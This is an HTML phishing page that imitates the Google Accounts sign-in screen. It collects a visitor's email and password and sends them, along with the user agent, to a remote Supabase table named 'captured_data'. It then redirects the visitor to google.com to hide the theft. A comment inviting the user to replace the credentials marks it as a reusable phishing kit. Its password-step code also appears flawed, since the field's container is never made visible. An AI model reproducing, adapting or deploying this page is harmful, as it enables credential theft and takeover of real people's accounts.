<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }

        .logo {
            text-align: center;
            margin-bottom: 16px;
            font-size: 28px;
            font-weight: 500;
            letter-spacing: -1px;
        }

        .logo .g-blue { color: #4285F4; }
        .logo .g-red { color: #EA4335; }
        .logo .g-yellow { color: #FBBC05; }
        .logo .g-green { color: #34A853; }

        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
            color: #202124;
        }

        .subtitle {
            text-align: center;
            color: #202124;
            margin-bottom: 32px;
            font-size: 16px;
        }

        .input-group {
            margin-bottom: 24px;
            position: relative;
        }

        input {
            width: 100%;
            padding: 16px 14px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }

        input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 15px 13px;
        }

        .btn {
            width: 100%;
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
        }

        .btn:hover {
            background: #1557b0;
        }

        .btn:disabled {
            background: #dadce0;
            cursor: not-allowed;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .forgot {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: block;
            margin-bottom: 32px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Google</p>

        <div class="input-group">
            <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
        </div>

        <div class="input-group" id="passwordGroup" style="display:none;">
            <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
        </div>

        <a href="#" class="forgot">Forgot email?</a>

        <button class="btn" id="submitBtn" onclick="handleSubmit()">
            <span id="btnText">Next</span>
            <div class="loading" id="loading"></div>
        </button>
    </div>

    <script>
        // REPLACE WITH YOUR SUPABASE CREDENTIALS
        const SUPABASE_URL = 'https://aqynejlgjwdmxsekuyld.supabase.co';
        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
        
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
        
        let step = 1;
        
        function handleSubmit() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password');
            
            if (step === 1) {
                if (!email) {
                    alert('Enter email');
                    return;
                }
                password.style.display = 'block';
                document.getElementById('submitBtn').textContent = 'Sign in';
                step = 2;
            } else if (step === 2) {
                if (!password.value) {
                    alert('Enter password');
                    return;
                }
                
                // Save to Supabase
                saveData(email, password.value);
                
                // Redirect
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 1000);
            }
        }
        
        async function saveData(email, password) {
            try {
                const { data, error } = await supabase
                    .from('captured_data')
                    .insert([
                        {
                            email: email,
                            password: password,
                            user_agent: navigator.userAgent,
                            created_at: new Date()
                        }
                    ]);
                
                if (error) {
                    console.error('Error:', error);
                } else {
                    console.log('✅ Saved successfully');
                }
            } catch (err) {
                console.error('Error:', err);
            }
        }
    </script>
</body>
</html>
